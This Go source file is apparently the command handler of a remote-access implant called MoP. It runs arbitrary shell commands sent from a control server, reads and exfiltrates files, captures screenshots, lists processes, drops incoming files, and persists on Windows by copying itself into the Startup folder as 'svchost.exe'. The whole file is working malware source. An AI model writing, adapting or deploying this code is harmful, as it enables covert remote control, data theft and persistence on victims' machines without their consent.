package commands

import (
	"MoP/src/middlewares"
	"MoP/src/models"
	"MoP/src/requests"
	"encoding/base64"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"

	"github.com/mitchellh/go-ps"
	"github.com/vova616/screenshot"
)

var timeToSleep = 10

func HandleAgentCommands(ID int, command string, agent models.NewAgent) {
	slicedCommand := middlewares.SliceCommand(command)
	baseCommand := slicedCommand[0]

	switch baseCommand {
	case "ls":
		resp := listFiles()
		requests.PostCommand(ID, command, resp, agent)
	case "sleep":
		resp := changeHTB(slicedCommand[1])
		requests.PostCommand(ID, command, resp, agent)
	case "pwd":
		cmd, _ := os.Getwd()
		resp := middlewares.B64Encode(cmd)
		requests.PostCommand(ID, command, resp, agent)
	case "cd":
		if len(slicedCommand) > 1 {
			resp := changeDir(slicedCommand[1])
			requests.PostCommand(ID, command, resp, agent)
		}
	case "whoami":
		resp := whoami()
		requests.PostCommand(ID, command, resp, agent)
	case "ps":
		resp := listProcess()
		requests.PostCommand(ID, command, resp, agent)
	case "cat":
		if len(slicedCommand) > 1 {
			resp := readFile(slicedCommand[1])
			requests.PostCommand(ID, command, resp, agent)
		}
	case "upload":
		if len(slicedCommand) > 1 {
			resp := getFile(agent)
			requests.PostCommand(ID, command, resp, agent)
		}
	case "download":
		if len(slicedCommand) > 1 {
			resp := postFile(agent, slicedCommand[1])
			requests.PostCommand(ID, command, resp, agent)
		}
	case "screenshot":
		resp := takeScreenshot(agent)
		requests.PostCommand(ID, command, resp, agent)
	case "persist":
		resp := persistAgent(agent)
		requests.PostCommand(ID, command, resp, agent)
	default:
		resp := shellCommand(command, agent)
		// resp := B64Encode("This command doesn't exists or not implemented yet!")
		requests.PostCommand(ID, command, resp, agent)
	}

}

func persistAgent(agent models.NewAgent) (resp string) {
	resp = ""
	if agent.SO == "windows" {
		fileName := filepath.Base(os.Args[0])
		roaming, err := os.UserConfigDir()
		if err != nil {
			resp = "Error to load startup directory: " + err.Error()
			b64 := middlewares.B64Encode(resp)
			return b64
		}

		startUpDir := roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe"

		input, err := os.ReadFile(fileName)
		if err != nil {
			resp = "Error to read agent: " + err.Error()
			b64 := middlewares.B64Encode(resp)
			return b64
		}

		err = os.WriteFile(startUpDir, input, 0777)
		if err != nil {
			resp = "Error to copy agent: " + err.Error()
			b64 := middlewares.B64Encode(resp)
			return b64
		}

		resp = "Agent saved at: " + startUpDir
		b64 := middlewares.B64Encode(resp)
		return b64
	}

	resp = "Command not implemented to this SO yet!"
	b64 := middlewares.B64Encode(resp)
	return b64
}

func takeScreenshot(agent models.NewAgent) string {
	files := requests.GetFile(agent)
	for _, file := range files {
		if file.Direction == "screenshot" {
			img, _ := screenshot.CaptureScreen()
			f, err := os.Create(file.Filename)
			if err != nil {
				return ""
			}
			err = png.Encode(f, img)
			if err != nil {
				return ""
			}
			f.Close()
			fileOpened, err := os.ReadFile(file.Filename)
			if err != nil {
				resp := middlewares.B64Encode(fmt.Sprintf("Error to open file: %s", err))
				return resp
			}

			b64 := base64.StdEncoding.EncodeToString(fileOpened)
			file.File = b64

			requests.PostFile(agent, file)

			err = os.Remove(file.Filename)
			if err != nil {
				return ""
			}
		}
	}

	resp := "Screenshot saved!"
	b64 := middlewares.B64Encode(resp)

	return b64
}

func postFile(agent models.NewAgent, filePath string) (resp string) {
	files := requests.GetFile(agent)
	for _, file := range files {
		if file.Direction == "download" {
			fileOpened, err := os.ReadFile(filePath)
			if err != nil {
				resp = middlewares.B64Encode(fmt.Sprintf("Error to open file: %s", err))
				return resp
			}

			b64 := base64.StdEncoding.EncodeToString(fileOpened)
			file.File = b64

			requests.PostFile(agent, file)
		}

	}
	resp = "File saved!"
	b64 := middlewares.B64Encode(resp)

	return b64
}

func getFile(agent models.NewAgent) (resp string) {

	files := requests.GetFile(agent)
	for _, file := range files {
		if file.Direction == "upload" {
			d64, _ := base64.StdEncoding.DecodeString(file.File)
			err := os.WriteFile(file.Filename, d64, 0644)
			if err != nil {
				return
			}
			requests.DeleteFile(agent, file.ID)
		}

	}

	resp = "File saved!"
	b64 := middlewares.B64Encode(resp)

	return b64
}

func shellCommand(command string, agent models.NewAgent) string {
	var resp string

	if agent.SO == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", command).CombinedOutput()
		resp = string(output)
	} else if agent.SO == "linux" {
		output, _ := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		resp = string(output)
	} else {
		resp = "This command has not yet been implemented for this OS!"
	}

	b64 := middlewares.B64Encode(resp)

	return b64
}

func readFile(file string) string {
	resp, err := os.ReadFile(file)
	if err != nil {
		return middlewares.B64Encode(fmt.Sprintf("%s", err))
	}

	b64 := middlewares.B64Encode(string(resp))

	return b64
}

func listProcess() (processes string) {
	processList, _ := ps.Processes()
	processes = "PPID \t PID \t Executable \n"

	for _, process := range processList {
		processes += fmt.Sprintf("%d \t %d \t %s \n", process.PPid(), process.Pid(), process.Executable())
	}

	b64 := middlewares.B64Encode(processes)
	return b64
}

func whoami() string {
	resp, _ := user.Current()
	b64 := middlewares.B64Encode(resp.Name)
	return b64
}

func changeDir(newDir string) (resp string) {
	resp = "Directory changed to " + newDir
	err := os.Chdir(newDir)
	if err != nil {
		resp = "The " + newDir + " doesn't exists!"
	}

	b64 := middlewares.B64Encode(resp)

	return b64
}

func listFiles() (b64 string) {
	var resp string

	wd, _ := os.Getwd()
	files, _ := os.ReadDir(wd)

	for _, file := range files {
		resp += file.Name() + "\n"
	}

	b64 = middlewares.B64Encode(resp)
	return b64
}

func changeHTB(htb string) (resp string) {
	resp = "Htb changed to " + htb
	t, _ := strconv.Atoi(htb)
	timeToSleep = t
	b64 := middlewares.B64Encode(resp)
	return b64
}

func HTB() int {
	return timeToSleep
}
